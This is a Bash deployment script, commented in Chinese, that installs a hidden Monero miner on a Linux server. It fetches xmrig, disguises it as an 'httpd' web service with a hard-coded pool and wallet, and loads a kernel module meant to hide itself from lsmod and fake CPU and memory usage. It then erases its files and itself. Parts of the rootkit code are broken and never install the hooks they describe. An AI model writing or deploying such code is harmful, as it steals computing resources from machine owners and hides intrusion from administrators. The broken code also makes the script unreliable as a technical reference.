#!/bin/bash

# 隐藏进程及其特征的一键部署脚本，同时伪装 CPU 和内存使用率

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc make systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入矿池 URL 和钱包地址
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录
mkdir -p /opt/utils /etc/systemd/system/conf.d /opt/kernel_module || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/utils/httpd
rm -rf /opt/utils/xmrig-6.22.2

# 创建 web wrapper 以伪装进程名
cat > /opt/utils/web.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "httpd", 0, 0, 0); // 伪装成 httpd 进程
    execv("/opt/utils/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/utils/web /opt/utils/web.c || { echo "编译 web wrapper 失败" 1>&2; exit 1; }
rm /opt/utils/web.c

# 生成配置文件
cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "donate-level": 0
}
EOF

# 创建内核模块源代码以伪装 CPU 和内存使用率
cat > /opt/kernel_module/sys_helper.c <<EOF
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <linux/syscalls.h>

// 定义伪装的 CPU 和内存使用率
static unsigned long fake_cpu_usage_percent = 10; // 伪装 CPU 使用率为 10%
static unsigned long fake_mem_usage_percent = 20; // 伪装内存使用率为 20%

// 原始函数指针
static unsigned long (*orig_cpu_load)(void);
static unsigned long (*orig_mem_info)(struct sysinfo *info);

// 伪装 CPU 使用率的钩子函数
static unsigned long fake_cpu_load(void) {
    return fake_cpu_usage_percent; // 返回伪装的 CPU 使用率
}

// 伪装内存使用率的钩子函数
static unsigned long fake_mem_info(struct sysinfo *info) {
    unsigned long ret = orig_mem_info(info);
    if (ret == 0) { // 确保原始函数调用成功
        info->totalram = 100; // 设置一个基准总内存
        info->freeram = 100 - fake_mem_usage_percent; // 计算伪装的可用内存
    }
    return ret;
}

// 函数替换函数
static inline void *hook_function(const char *name, void *fake_func) {
    void *orig_func = (void *)kallsyms_lookup_name(name);
    if (!orig_func) {
        printk(KERN_ERR "无法找到符号: %s\n", name);
        return NULL;
    }
    return orig_func;
}

// 模块初始化
static int __init sys_helper_init(void) {
    // 隐藏模块自身，避免被 lsmod 检测
    list_del_init(&THIS_MODULE->list);

    // 钩子 CPU 使用率统计函数（示例函数名，需根据内核版本调整）
    orig_cpu_load = hook_function("cpu_load_avg", fake_cpu_load);
    if (!orig_cpu_load) {
        printk(KERN_ERR "CPU 使用率钩子失败\n");
        return -1;
    }

    // 钩子内存使用率统计函数
    orig_mem_info = hook_function("sysinfo", fake_mem_info);
    if (!orig_mem_info) {
        printk(KERN_ERR "内存使用率钩子失败\n");
        return -1;
    }

    printk(KERN_INFO "伪装模块加载成功\n");
    return 0;
}

// 模块退出
static void __exit sys_helper_exit(void) {
    printk(KERN_INFO "伪装模块卸载\n");
}

module_init(sys_helper_init);
module_exit(sys_helper_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("System Helper Module for CPU and Memory Usage Masking");
EOF

# 创建 Makefile
cat > /opt/kernel_module/Makefile <<EOF
obj-m += sys_helper.o

all:
    make -C /lib/modules/$(uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(uname -r)/build M=$(PWD) clean
EOF

# 编译内核模块
cd /opt/kernel_module
make || { echo "内核模块编译失败" 1>&2; exit 1; }

# 加载内核模块
insmod sys_helper.ko || { echo "加载内核模块失败" 1>&2; exit 1; }

# 清理编译临时文件
make clean || { echo "清理内核模块编译临时文件失败" 1>&2; }

cd -

# 检查 httpd 用户和组是否存在
if ! id "httpd" &>/dev/null; then
    if ! getent group "httpd" &>/dev/null; then
        groupadd -r httpd || { echo "创建组 httpd 失败" 1>&2; exit 1; }
    fi
    useradd -r -s /bin/false -g httpd httpd || { echo "创建用户 httpd 失败" 1>&2; exit 1; }
else
    echo "用户 httpd 已存在，跳过创建步骤"
fi

# 创建 systemd 服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/utils/web --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=8
Restart=always
CPUQuota=90%

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service
systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }

# 等待挖矿进程启动
sleep 5

# 删除中间文件
rm -f /etc/systemd/system/conf.d/httpd.conf
rm -f /opt/utils/httpd
rm -f /opt/utils/web

# 删除脚本自身
rm -- "$0"
echo "部署完成！"
